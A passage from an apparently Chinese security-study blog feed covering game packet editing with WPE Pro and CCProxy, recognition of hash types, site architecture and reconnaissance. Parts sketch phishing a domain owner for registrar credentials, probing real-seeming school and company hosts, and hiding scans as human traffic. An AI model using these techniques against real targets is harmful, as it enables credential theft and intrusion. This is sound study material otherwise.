<h3><span id="封包编辑packet-editing">封包编辑（Packet Editing）</span></h3><p>封包编辑指的是捕获、分析、修改和重放网络封包的过程。这通常用于网络调试、性能测试、漏洞利用等场景。WPE（Winsock Packet Editor）是常用的封包编辑工具之一。</p>
<h3><span id="wpewinsock-packet-editor封包编辑技术">WPE（Winsock Packet Editor）封包编辑技术</span></h3><p>WPE Pro 是一种流行的网络封包编辑工具，用于捕获和修改通过 Windows 网络堆栈传输的数据包。以下是使用 WPE 进行封包编辑的步骤：</p>
<h4><span id="1下载并安装-wpe-pro">1.下载并安装 WPE Pro</span></h4><p>首先，从可信的来源下载并安装 WPE Pro。</p>
<h4><span id="2-打开目标程序">2. 打开目标程序</span></h4><p>启动你想要捕获和编辑封包的应用程序。例如，一个网络游戏或聊天程序。</p>
<h4><span id="3-启动-wpe-pro">3. 启动 WPE Pro</span></h4><p>启动 WPE Pro，并在工具界面中选择“Target Program”按钮，选择你要监控的目标程序。</p>
<h4><span id="4-捕获封包">4. 捕获封包</span></h4><p>在 WPE Pro 中，点击“Play”按钮开始捕获封包。然后在目标程序中执行一些操作（如发送消息、移动角色等）。</p>
<h4><span id="5-停止捕获并分析封包">5. 停止捕获并分析封包</span></h4><p>完成操作后，点击“Stop”按钮停止捕获。你将看到捕获到的封包列表。</p>
<h4><span id="6-修改封包">6. 修改封包</span></h4><p>选中你想要修改的封包，右键选择“Send”或“Send to Send List”。在“Send List”中，你可以编辑封包的数据内容。修改完成后，点击“Send”按钮发送修改后的封包。</p>
<h4><span id="示例步骤">示例步骤：</span></h4><p>假设你在一个在线游戏中想要修改发送的聊天消息：</p>
<ol>
<li>在游戏中发送一条消息（如“Hello”）。</li>
<li>在 WPE Pro 中捕获到相应的封包。</li>
<li>找到包含“Hello”消息的封包，右键选择“Send”或“Send to Send List”。</li>
<li>在编辑器中将“Hello”修改为其他内容（如“Hi there”）。</li>
<li>点击“Send”按钮发送修改后的封包，观察游戏中的变化。</li>
</ol>
<p>也可以封装一个回城功能（doge）,然后通过发送整合后的数据包就可以实现游戏外回城的功能（doge）</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714213902020.png" alt="image-20240714213902020"></p>
<p>所以封包和wireshark监听查找进程的本质区别在于封包是一组整合的数据包，wireshark查找进程是一堆零散的数据包</p>
<p>步骤：</p>
<p>1.首先在模拟器中先装上代理机器人</p>
<p>2.对应的打开ccproxy设置代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">四件套示意图</span><br><span class="line">apk --&gt; ccproxy  --&gt;wpe监听cc进程，实现封包抓包</span><br><span class="line"></span><br><span class="line">burp charles</span><br><span class="line">模拟器设置证书后，设置代理，运行工具的本机IP 端口</span><br><span class="line">burpsuite茶杯 配置代理 监听抓取</span><br><span class="line"></span><br><span class="line">wireshark 科来  不需要设置任何东西</span><br><span class="line">只是监听全频段网络接口</span><br></pre></td></tr></table></figure>

<p>这里也可以用<strong>下雪的傻瓜式封包监听工具</strong>，不过现在一般模拟器都已经上了一层防护了，不会轻易的让你使用模拟器对应的进程名，所以这个时候更新工具版本或者选择一些老版本模拟器（）说不定有奇效</p>
<p>当然这是因为WPE工具已经太老了，基本的原理连逍遥安卓论坛都能讲明白，加上一层比较基本的防护器就可以防御住了，这后面再细说</p>
<p>雷电模拟器的进程一般是这个</p>
<p>X64进程名|Ld9BoxHeadless.exe|PID|30320</p>
<p>但是进程ID可能会实时改变（？）</p>
<p>在我封包成功一次过后雷电模拟器好像把PID给换了，细思极恐</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715145004014.png" alt="image-20240715145004014"></p>
<h1><span id="抓包应用协议">抓包应用协议</span></h1><p>分为Web协议和非Web协议</p>
<h1><span id="抓包应用意义">抓包应用意义</span></h1><p>把app中的一些数据或者一些信息提取出来，就是这么简单，然后将这些信息用于对应的安全攻防。</p>
<h1><span id="封包应用意义">封包应用意义</span></h1><p><strong>WPE四件套封包&amp;科来网络分析系统  Wireshark</strong></p>
<p><strong>Burpsuite&amp;Charles&amp;Fiddler</strong></p>
<h2><span id="傻瓜式封包流程">傻瓜式封包流程</span></h2><p>封包工具可以将类似于游戏这种实时交互的网站做完整的监听而非拦截</p>
<h3><span id="进程获取">进程获取</span></h3><p>没有发现模拟器对应的进程，那么封包也是天方夜谭</p>
<p>首先通过Wireshark或者科来网络分析系统监听本机进程，并在游戏中多进行释放技能，领取奖励等数据包交互很多的操作，可以发现对应的字节波动大的进程，通过进程名推敲一下看看是否就是这个模拟器的进程。</p>
<h3><span id="最后封包">最后封包</span></h3><p>后续直接用封包工具对模拟器起一个监听，然后打开监听，在游戏内进行想要封包的操作（例如回城等），点击回城后关闭监听开始测试抓取到的数据包，如果选中的数据包发送后能够成功实现该功能，则说明封包成功（虽然Burpsuite其实也能做到直接监听对应模拟器配置的虚拟网卡）</p>
<h2><span id="进阶封包流程">进阶封包流程</span></h2><p>进阶的封包无非是在模拟器中装入代理机器人，后续代理机器人将抓到的数据包传回到本机的CCproxy（也是工具），CCproxy对应的进程则被WPE所监听，但由于这个流程已经太老了，模拟器以及游戏本身可能都有对应的防护，所以一般傻瓜式封包会比进阶封包更容易抓到包。</p>
<p><strong>后续有条件一定要自己尝试写出来封包监听工具，毕竟公开的工具会被ban，但公开的原理不会，通过进阶封包这里学得原理，自己做个封包监听工具又有何不可呢。</strong></p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>pr0gram</tag>
      </tags>
  </entry>
  <entry>
    <title>从0开始的渗透Day4-6desu</title>
    <url>/2024/07/15/%E4%BB%8E3%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F1/</url>
    <content><![CDATA[<h1><span id="如读者有未授权渗透行为后果自负本站仅作学习用途">如读者有未授权渗透行为，后果自负，本站仅作学习用途</span></h1><h1><span id="day430余种加解密编码进制ampweb-amp数据库amp系统amp代码amp参数值">Day4:30余种加解密编码进制&amp;Web &amp;数据库&amp;系统&amp;代码&amp;参数值</span></h1><h2><span id="加解密编码进制">加解密编码进制</span></h2><p>识别算法编码类型</p>
<p>1.看密文位数</p>
<p>2.看密文的特征（数字，字符，大小写，符号等）</p>
<p>3.看当前密文存在的地方（Web，数据库，操作系统等应用）</p>
<p>演示案例如下，接下来会从这些方面出发</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163704329.png" alt="image-20240715163704329"></p>
<p>详细列举</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163856227.png" alt="image-20240715163856227"></p>
<p>对于一些密码算法，类似md5这类不可逆的密码算法</p>
<p>这个时候解密的方式就有：<strong>枚举和碰撞</strong></p>
<p><strong>解密不通过算法解密，而是尝试生成很多的加密或对应明文的字符来枚举</strong></p>
<p>同时加密的应用场景比较多，这里列举出这些</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715164423363.png" alt="image-20240715164423363"></p>
<p>加密存储相对明文存储而言，不同之处就在于在攻防过程中，如果你的密文设置的足够复杂，其实也可以防止攻击端进一步攻击网络资产。</p>
<p>—-1—</p>
<p>类似于最基本的md5加密，类似个人博客这种最基本的站点，一般会采取md5加密，这个时候假设你进入了数据库，可以直接利用某些线上工具完成解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170018370.png" alt="10"></p>
<p>—2—</p>
<p>对应了<strong>国外论坛discuz类的站点</strong>采用了md5+salt加密的方式，在本身就用md5加密的条件下还额外加入了“salt“字段，这个时候使加密更加完善，攻击者在未知网站信息或存储机制的情况下难以进一步操作</p>
<p>不过还是有机会通过一些信息的收集得知其加密的机制的</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715165911780.png" alt="image-20240715165911780"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170242476.png" alt="image-20240715170242476"></p>
<p>密算法是不可能第一时间就能知道的，而是要对这个站点采取信息收集，收集过后找到对应的架构是怎么样的**Web站点 **了，那么这个加密算法具体怎么实现的也就可以通过网上的信息，甚至是自己搭一个这样的站点，对应这些思路自然也就一通百通。</p>
<p>这里介绍一个工具，mimikatz，它是用于获取windows系统上所有的明文和密钥进行获取。 不过这个不一定有用，因为mimikatz对应在windows2008后版本取消显示明文密码过后，作用并不是那么明显。</p>
<p>不过从这里可以看出，不管是什么样的架构都有迹可循。</p>
<p>这样就能防止我们单纯的拿到明文过后却无计可施。 </p>
<p><strong>不只是有存储类的加密</strong>，<strong>就连代码也会有对应的代码加密</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715205508717.png" alt="image-20240715205508717"></p>
<p>对应的 数据库也有对应的密文加密方式</p>
<p>以及浏览器也是对应有其加密方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715211129660.png" alt="image-20240715211129660"></p>
<p>这些只要掌握大概，以及懂得工具的使用就可以了</p>
<h1><span id="day5资产架构amp端口amp应用ampcdnampwafamp站库分离amp负载均衡">Day5：资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</span></h1><p>本阶段复现可能需要基于<strong>阿里云服务器+完整备案后域名+宝塔面板&#x2F;github上自主部署服务。</strong></p>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZqNyI04OHsCJqTXg5b9F0RmJpBNvbD9ZF0Q&s" alt="关注永雏塔菲谢谢喵什么梗- 抖音"></p>
<h2><span id="资产架构-端口amp目录amp插件接口amp多站点amp多应用">资产架构-端口&amp;目录&amp;插件接口&amp;多站点&amp;多应用</span></h2><h3><span id="站点结构">站点结构</span></h3><h4><span id="目录型">目录型</span></h4><p> 这里由于Satoru前期部署网站和域名备案等琐事，时间线拉长的让人寒心，只能找Wells要了个子域名，所以这里也懒得用我已经部署好的网站重新演示一遍（主要是完整的站点目录我只拿着一个子域名也很难复现（戳手手））</p>
<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHNG07AZ4KHRaS7k_YotkiGRnl7kIwbX9hMQ&s" alt="塔菲盒官方下载-永雏塔菲盒(Taffy盒)下载v1.0 安卓版-100手游网"></p>
<p>这里已经通过域名解析服务器IP，后续宝塔面板一键部署该域名解析的服务器上实现了建站。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717095245678.png" alt="image-20240717095245678"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102335544.png" alt="image-20240717102335544"></p>
<p>现在只是单独一个网站，那么假设我在对应的域名目录下新建除了这个网站目录之外的博客目录，并在里面部署网站的话，那么这个站点则也会出现在这个域名的目录结构下，那么会呈现的效果也就是这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102620385.png" alt="image-20240717102620385"></p>
<p>​					<strong>对应的目录型站点也就成立了</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102705476.png"></p>
<p>结构也就显而易见了</p>
<p><strong>bbs.xiaodi8.com —对应主目录网站</strong> </p>
<p><strong>bbs.xiaodi8.com&#x2F;blog —wordpress程序</strong></p>
<p>一个网站，两个程序，作为目录型站点，任何一个程序出现漏洞，都可以进入安全测试</p>
<h4><span id="端口型">端口型</span></h4><p>新的网站部署过程中，可以采用对域名bbs.xiaodi8.com额外划出88端口这样的操作，这个时候也是实现了一个网站多个程序的效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103213134.png" alt="image-20240717103213134"></p>
<p>这个其实本质上也不用我额外多说，就是类似这样的结构</p>
<p><strong>bbs.xiaodi8.com –主网站</strong></p>
<p><strong>bbs.xiaodi8.com:8081  –wordpress程序</strong></p>
<h4><span id="多个站点">多个站点</span></h4><p>多个站点类的网站其实原理也比较通俗，就是通过一些子域名实现多程序的部署</p>
<p>类似这里直接给即将部署的服务额外的域名edu.xiaodi8.com</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103544082.png" alt="image-20240717103544082"></p>
<p><strong>对应这两个域名解析都指向服务器IP</strong></p>
<p><strong>给定目标是bbs.xiaodi8.com 交给你渗透，我们也就可以尝试对服务下 edu.xiaodi8.com进行安全测试。毕竟二者指向IP相同</strong></p>
<p>这三种网络结构，也给了我们更多的可能性和更多的目标。 </p>
<h3><span id="插件">插件</span></h3><p>一般的站长，为了满足网站更多的功能亦或是让自己管理更加方便，可能都会安装一些插件，在安装插件的过程中，如果插件爆出了问题，那么也是会对网站本身造成危害。</p>
<p>web源码插件</p>
<p>web应用插件  类似phpmyadmin -设计是便于管理数据库的</p>
<p>类似的使用fofa就能找到很多部署在公网上的phpmyadmin站点</p>
<p>对应的fofa站点：<a href="fofa.so">fofa</a></p>
<p>fofa搜索语法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717105107703.png" alt="image-20240717105107703"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112530642.png" alt="image-20240717112530642"></p>
<p><strong>方便了管理者管理数据库，也拓展了攻击者通过这个接口攻击不支持外链数据库的可能性。</strong></p>
<h3><span id="服务器应用">服务器应用</span></h3><p><strong>ftp</strong>  方便管理员进行文件传输操作，也方便攻击者攻击ftp协议服务 比如上传一些后门文件等等</p>
<h3><span id="总结">总结</span></h3><p><strong>电子功能越多，对应的可攻击点越多</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112447372.png" alt="image-20240717112447372"></p>
<h2><span id="番外安全-域名amp服务器本身amp服务厂商amp管理人员">番外安全-域名&amp;服务器本身&amp;服务厂商&amp;管理人员</span></h2><h3><span id="域名">域名</span></h3><p>对于一个由服务器+域名组成的服务：</p>
<p><strong>假设</strong> </p>
<p>如果攻击者能够得到阿里云本身的账号密码，那么登录进去就可以进行这个域名的解析管理：</p>
<p>所以作为攻击者，如果可以收集到对应域名的注册商，对这个域名的使用人员采取社工学的信息收集（<strong>直接爆破域名注册平台风险是非常大的，同时对于这种未授权行为是由一套非常严格的管控措施的，所以请读者不要进行一些未授权的行为！如有违规行为后果自负</strong>）</p>
<p><strong>对使用人员的信息收集可以从其在不同站点的使用库入手</strong>，对应的推敲出这个平台的号码，可以发掘这个域名注册平台注册密码时是否需要大写或者特殊符号等，然后结合其他站点这个使用人员的个人习惯推敲对应的账号密码。</p>
<p>抑或是通过<strong>搭建钓鱼站点以及钓鱼邮件</strong>的方式，对照域名注册平台的要求设置注册密码时的框架，这个时候大体上该使用者极有可能会采取同一套密码进行注册</p>
<p><strong>甚至可以直接对使用者本人进行一些诱导，直接和使用者本人进行接触</strong>并进行多维度的渗透，看看这个使用者当前阶段所做的事，投其所好攻其必救，直接将密码凭据拿走。这就是点对点的攻击desu</p>
<p>因为本质上，服务器就是人管理的</p>
<h3><span id="实战">实战</span></h3><h4><span id="日edu">日edu</span></h4><p><strong>这个素材是21年左右的，不过还是有实践意义的</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717153941814.png" alt="image-20240717153941814"></p>
<p><strong>信息点1</strong></p>
<p>采用的是DMU email 虽然不知道是不是学校本身的logo之类的，但也可以搜一下看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717154900573.png" alt="image-20240717154900573"></p>
<p>可以发现确实是他们学校自己的logo，这边2024年已经出台了很多对应的管理办法等等提高用户安全意识了，不过也可以趁此机会看看有没有过滤器，过滤的点是什么。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717155310868.png" alt="image-20240717155310868"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717155602753.png" alt="image-20240717155602753"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717155634953.png" alt="image-20240717155634953"></p>
<p><strong>信息点2</strong></p>
<p>爆破端口发现了8080上部署了一个网关类服务，采用的是eYou邮件网关，去网上搜一下对应的有没有存在什么漏洞。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717154944753.png" alt="image-20240717154944753"></p>
<p>好家伙，已经明摆着让我们攻击了</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717155047976.png" alt="image-20240717155047976"></p>
<p>也就是在这个网站上，对应的两个服务中只要有一个被我成功应用到了，那就有机会把整个服务器拿下。</p>
<p>这里对应了端口类服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717161623661.png" alt="image-20240717161623661"></p>
<p>目前已修复成这样，大概是外包给安全公司了，大家就暂时别想了（）</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717154729681.png" alt="image-20240717154729681"></p>
<h4><span id="日企业站点">日企业站点</span></h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717161706580.png" alt="image-20240717161706580"></p>
<p><strong>甚至phpmyadmin也是暴露在8081上的，那么可以考虑一下这个第三方应用有没有弱口令可以作为攻击点</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717161721031.png" alt="image-20240717161721031"></p>
<h4><span id="日网站">日网站</span></h4><p>在这里略显无从下手，无法找到明面上的太多漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717161916481.png" alt="image-20240717161916481"></p>
<p>这个时候也是通过信息收集，发现其管理者为了方便上了ftp服务，这里就可以直接这么利用</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717162306688.png" alt="image-20240717162306688"></p>
<p>这就是安装了服务器应用的网站典型，ftp协议也成为了对应的攻击点</p>
<h2><span id="考虑阻碍-站库分离ampcdnampwapamp负载均衡amp主机防护">考虑阻碍-站库分离&amp;CDN&amp;WAP&amp;负载均衡&amp;主机防护</span></h2><h3><span id="站库分离">站库分离</span></h3><p>搭建网站的过程中，一般会填写一些数据库的信息。那么有一种情况，管理者将源码放在一个IP，数据库则对应部署在另一个IP，这么做就属于网站建立后会调用远端的数据库，形成一个站库分离。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717162645305.png" alt="image-20240717162645305"></p>
<p>站库分离的好处是容易导致攻击者陷入下面的情境：</p>
<p>攻击者攻击的漏洞是基于攻击数据库的</p>
<p>攻击者拿下了网站源码对应的服务器，但是发现数据库不在服务器上</p>
<p>这真是想想就会让攻击者红温</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
<h3><span id="cdn加速服务">CDN加速服务</span></h3><p>CDN就是为了解决网络访问输入的一个服务，具体详参<a href="https://xzb666-hub.github.io/2024/07/10/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">这篇文章</a></p>
<p>比如我们访问<strong>Baidu.com</strong>，这时因为Baidu.com想提升用户的体验，那么在冰岛的我访问<strong>Baidu.com</strong>就对应了Baidu在冰岛部署的一个节点所提供的服务，用CDN这样的效果达到提高用户访问效率。</p>
<p>节点就意味着一种缓存，类似迅雷下载的<a href="https://www.cnblogs.com/erwin/archive/2009/07/24/1529809.html">p2p机制</a>,比如我们从迅雷上下载某个软件，本质上下载的是上一个用户下载后留下的缓存，这种缓存机制本来是为了缓解网站通讯紧张的一种解决方案，但还是留给了安全测试者一个难题，面对访问的网站可能只是浏览器在最近节点爬下来的，而不是真实储存的IP，这个时候的攻击是没有任何危害的，而对于攻击者来说，这个时候是否还有攻击的必要? </p>
<h3><span id="负载均衡">负载均衡</span></h3><p><a href="https://developer.aliyun.com/article/1486102">负载均衡</a>是在运维里经常出现的概念，其实本质就是一种<strong>防累积</strong>的机制。</p>
<p>比如京东，淘宝这种网站，对于大规模的用户群里大量的攻击，即使服务器安全，但也排除不了服务器硬件突然崩溃或者累积。</p>
<p>所以为了防止这种情况，它就会选择多台服务器作为备用机，也就相当于矛盾转移，一台服务器崩溃了那么剩下的服务器就可以顶上。</p>
<p>宝塔面板中也有这种服务（只是付费，建议自己以后建站搜个教程学）</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718200538430.png" alt="image-20240718200538430"></p>
<p>也就是说，对于安全测试者，进行安全测试的时候有可能是备用机提供的服务，也就是攻击的服务器极有可能还不是那台核心服务器，拿到的权限可能只是备用机的权限，比如我要得到里面什么东西或者得到flag需要root权限，但备用机只有普通用户权限，这个时候攻击的性价比就难以衡量了。</p>
<h3><span id="waf防火墙">WAF防火墙</span></h3><p>其实本质就是防止漏洞攻击的一个防护器</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718201646676.png" alt="image-20240718201646676"></p>
<h3><span id="主机防护">主机防护</span></h3><p>本质就是杀毒软件，会检测木马or病毒，主机防护还会监听对应的用户操作，比如上传文件等。</p>
<p>典例：安全狗</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718201835136.png" alt="image-20240718201835136"></p>
<p>所以在安全测试中，哪怕攻击点很多，但也还是会遇到很多阻碍，而后续的渗透文章中则会基于如何绕过这些防护器开始说明，同时也会对更多的内容做进一步的拓展。</p>
<h1><span id="day6信息打点-web架构篇amp域名amp语言amp中间件amp数据库amp系统amp源码获取">Day6：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</span></h1><p>一般其实是叫信息收集的，但这里模仿红队的外网打点这一说法，也就叫做信息打点得了。今天主要围绕这些知识点desu</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718203421598.png" alt="image-20240718203421598"></p>
<p>信息收集本质收集的其实就这几样：</p>
<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
<h1><span id="源码">源码</span></h1><p><strong>源码获取是十分重要的，后期80%的攻击其实都是基于前面信息收集对该网站构成组的分析</strong></p>
<p>按照上述知识点所讲述的：</p>
<p>（1） 第一类源码的区分标准大家都很好理解，就是对应不同的组成特性去爬取我们需要的信息（比如历史漏洞或者补丁等）。</p>
<p>（2）第二类源码的区分就比较有门道了，它是相对于Web源码开源和收费两种进行区分，如果这个源码是开源的，那么很简单，这也就是可下载的内容，甚至可以扒下来丢给GPT，<strong>那么闭源甚至自主研发这种找不到的呢？</strong>这个该怎么通过被加密甚至是根本拿不到的核心源码，就此找到漏洞，这个就是更为困难的点。</p>
<p>不过对应的，这些也跟站点本身牵涉到的利益有关。假设是我这个博客，最多也就是网站被挂到孙吧供广大黄牌参观，于我何加焉？？？</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718204818716.png" alt="image-20240718204818716"></p>
<h2><span id="案例一个人博客">案例一：个人博客</span></h2><p>xiaodi8.com也是老演员了，该怎么追溯这个网站的组成呢？其实打开浏览器然后对应审查network基本上就可以从默认加载的地址里面找到一些信息 比如后缀.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718205640400.png" alt="image-20240718205640400"></p>
<p>也可以从上图中的响应头比如server对应的中间件或者X-powered-by对应的语言，当然也可以访问一下版权头之类的看看它采用的程序是否有CMS开源的源码，</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718205822546.png" alt="image-20240718205822546"></p>
<p>类似xiaodi8.com采用的就是开源的ZBlog框架以及php语言，同时中间件是基础的Apache，</p>
<h3><span id="该怎么查询数据库和操作系统嘞">该怎么查询数据库和操作系统嘞</span></h3><h4><span id="操作系统">操作系统</span></h4><p>其实可以在网站的URL栏对应的GET传参中，将类似id&#x3D;6这种传入参数的操作改成ID&#x3D;6，如果仍然满足查询，那么极有可能是windows系统（大小写不敏感），反之则极有可能是Linux系统。</p>
<p>亦或者可以使用ping命令，通过对应的TTL值去判断操作系统</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718211654318.png" alt="image-20240718211654318"></p>
<p> 不过刚刚ping了两个服务器，好像值都不是很契合，这是为什么呢（）挖个坑</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718211249858.png" alt="image-20240718211249858"></p>
<p>这里填坑：</p>
<p>这里一般是判断离哪个大众的TTL值比较近，操作系统对应的就是哪一个。</p>
<p>而且ping域名和ping真实ip的ping值是相同的，如果给你两个可疑的IP和一个真实的域名，也可以直接用ping和TTL值判断喵！</p>
<p>这里Satoru拿了Wells的ip作为案例ping了一下，发现对应的TTL值是89，对应的已知他的服务器是阿里云上买的，阿里云市面上的镜像有Linux和windows，那么这里大胆推测Linux（毕竟不信他会自定义一个莫名的SunOS镜像），然后在fofa上对应的搜索一下，就是Linux镜像没错了。</p>
<h4><span id="数据库的判定">数据库的判定</span></h4><p>数据库的判定一般可能会思考市面上的搭建组合，亦或是采用端口扫描工具直接获取信息，这也同样适用于中间件</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20240718212710.png" alt="“”"></p>
<p>类似于php这种脚本语言，就可以这么搜：php和哪个数据库最搭配？</p>
<p><strong>甚至可以这样社工你对应测试站点的哥们。。。</strong></p>
<p>对应的数据库很多，对应的有<strong>access，mysql，redis，mssql，mongDB，oracle，postgresql。</strong></p>
<p>这些数据库运营的时候很有可能会开放一个端口，这些数据库对应的都有其很常用的端口，这些也可以网上直接搜。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718213121767.png" alt="不过"></p>
<p>对应的工具也就推荐一下Nmap等，不过只有手工学好了，用工具才得心应手。</p>
<p>当然查询的过程中分为主动查询和被动查询，主动查询是类似在<strong>SRC规则中某些应用严令禁止的大流量查询，比如说Nmap等一堆工具直接下去开扫，这样扫的好处是省事省心，那么顺带进去喝个茶其实也就是顺带</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
<p>或者可以被动式查询，从网络上进行一些已知信息的汲取，或者某些工具搭载了被动扫描，<strong>虽然需要我们人为点击然后它对对应的站点发送一些payload，不过只要目标精确也不是什么大问题，这样做甚至可以模仿着人的流量，使攻击更为隐蔽化。</strong></p>
<p>当然这里更推荐端口扫描的过程中利用一些网上现成的端口扫描工具（反正是这个接口的事），或者全程开着虚拟机作为一个全隔离的测试环境。</p>
<p>源码得到过后–直接利用公开的漏洞尝试安全测试</p>
<p>源码-白盒代码审计 挖漏洞</p>
<p>然后对应的收集信息就可以如此往下拓展</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240718225746116.png" alt="image-20240718225746116"></p>
<h3><span id="案例二某违法app-面具约会">案例二：某违法app  面具约会</span></h3><p><strong>如读者有未授权渗透行为，后果自负，本站仅作学习用途</strong></p>
<p><strong>如读者有未授权渗透行为，后果自负，本站仅作学习用途</strong></p>
<p><strong>如读者有未授权渗透行为，后果自负，本站仅作学习用途</strong></p>
<p>这类app更多是属于闭源售卖类，一般会在一些源码售卖网站上打点擦边球。</p>
<p>对应的在模拟器打开该神秘软件，通过burp监听对应的网卡。对应的分析数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240719113952690.png" alt="image-20240719113952690"></p>
<p>这里发现<strong>Host是api.map.baidu.com</strong></p>
<p>对应的，一般打开app的时候会涌进来不止一个数据包，例如面具约会（），它需要调用百度的地图接口为你推荐对应的心动嘉宾，又或者引入一个外链bot给你弹约会的消息，所以这些数据包有些并不是这个app本身的服务，而是调用了外界的服务为自己的服务服务（有点绕）</p>
<p>这个时候就一直放行，直到找到可疑的数据包</p>
<p><strong>后续的过程中，就是不断审计数据包，可以通过Host头查看是什么</strong></p>
<p>同时把可疑的数据包发送到重放器并查看对应的响应，如果是正确对应的数据包，那么可以进入下一步溯源工作</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240719150344443.png" alt="image-20240719150344443"></p>
<p>结合Host和Post传参所在的目录，溯源并发送POST传参的数据，后续得到反馈后可以直接检索对应app内页面的一些信息，能对得上就是溯源成功了。</p>
<p><strong>同时就可以通过分析响应包，端口扫描等操作分析构成。</strong></p>
<p><strong>类似的，对应这类源码也可以在fofa上搜索，通过一些关键词检索套出对应的源码效果</strong></p>
<h3><span id="案例三爱心工程-网站站点">案例三：爱心工程 –网站站点</span></h3><p>可以通过查找对应注册的域名，以及备案信息，企业注册的时候涉及到的一些资产。以及可以通过一些资源的变动</p>
<p>比如说该域名为</p>
<p><a href="http://www.pax666.com/">www.pax666.com</a></p>
<p>可以通过查询 pax666.com（去3w前缀）等方式进行对应的查询。</p>
<p>所以，域名上面的信息打点也是大有文章</p>
